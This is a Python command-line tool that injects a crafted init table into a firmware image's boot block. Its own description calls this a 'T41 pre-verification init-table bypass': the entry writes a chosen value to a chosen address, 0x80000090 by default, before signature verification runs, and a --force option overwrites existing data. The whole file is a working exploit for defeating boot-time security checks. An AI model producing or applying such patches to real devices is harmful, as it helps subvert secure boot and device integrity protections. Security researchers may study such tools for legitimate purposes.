#!/usr/bin/env python3

from __future__ import annotations

import argparse
import hashlib
import struct
from pathlib import Path

MAGIC = 0x45474E49  # "INGE" little-endian
INIT_OFFSET = 0x100
ENTRY0_OFFSET = 0x120
TERM_OFFSET = 0x134
PATCH_LEN = 0x48


def parse_int(value: str) -> int:
    return int(value, 0)


def default_output_path(input_path: Path) -> Path:
    return input_path.with_name(f"{input_path.stem}-t41-init-bypass{input_path.suffix}")


def inject_patch(
    data: bytearray,
    boot_offset: int,
    target_addr: int,
    write_value: int,
    force: bool,
) -> None:
    start = boot_offset + INIT_OFFSET
    end = start + PATCH_LEN
    if end > len(data):
        raise ValueError("image too small for init-table injection at requested boot offset")

    region = data[start:end]
    if not force and any(region):
        raise ValueError(
            f"init-table region {start:#x}..{end - 1:#x} is not blank; rerun with --force to overwrite"
        )

    struct.pack_into("<I", data, boot_offset + INIT_OFFSET, MAGIC)
    struct.pack_into("<I", data, boot_offset + INIT_OFFSET + 4, 0)
    struct.pack_into(
        "<IIIII",
        data,
        boot_offset + ENTRY0_OFFSET,
        target_addr,
        0xFFFFFFFF,
        write_value,
        0,
        0,
    )
    struct.pack_into(
        "<IIIII",
        data,
        boot_offset + TERM_OFFSET,
        0xFFFFFFFF,
        0xFFFFFFFF,
        0,
        0,
        0,
    )


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Inject the T41 pre-verification init-table bypass into a full firmware image."
    )
    parser.add_argument("input", type=Path, help="Path to input firmware image")
    parser.add_argument(
        "-o", "--output", type=Path, help="Path to patched output image (default: add -t41-init-bypass)"
    )
    parser.add_argument(
        "--boot-offset",
        type=parse_int,
        default=0,
        help="Offset of the boot block within the full image (default: 0)",
    )
    parser.add_argument(
        "--target-addr",
        type=parse_int,
        default=0x80000090,
        help="32-bit address to write from the injected init table (default: 0x80000090)",
    )
    parser.add_argument(
        "--write-value",
        type=parse_int,
        default=0,
        help="32-bit value to write to --target-addr (default: 0)",
    )
    parser.add_argument(
        "--force",
        action="store_true",
        help="Overwrite a nonblank init-table slot instead of refusing to patch",
    )
    args = parser.parse_args()

    if not args.input.is_file():
        parser.error(f"input image not found: {args.input}")

    output = args.output or default_output_path(args.input)
    data = bytearray(args.input.read_bytes())
    inject_patch(data, args.boot_offset, args.target_addr, args.write_value, args.force)
    output.write_bytes(data)

    sha256 = hashlib.sha256(data).hexdigest()
    patch_start = args.boot_offset + INIT_OFFSET
    patch_end = patch_start + PATCH_LEN
    print(f"input:       {args.input}")
    print(f"output:      {output}")
    print(f"size:        {len(data)} bytes ({len(data):#x})")
    print(f"boot_offset: {args.boot_offset:#x}")
    print(f"target_addr: {args.target_addr:#x}")
    print(f"write_value: {args.write_value:#x}")
    print(f"patch_range: {patch_start:#x}..{patch_end - 1:#x}")
    print(f"sha256:      {sha256}")
    print(f"patch_bytes: {data[patch_start:patch_end].hex()}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())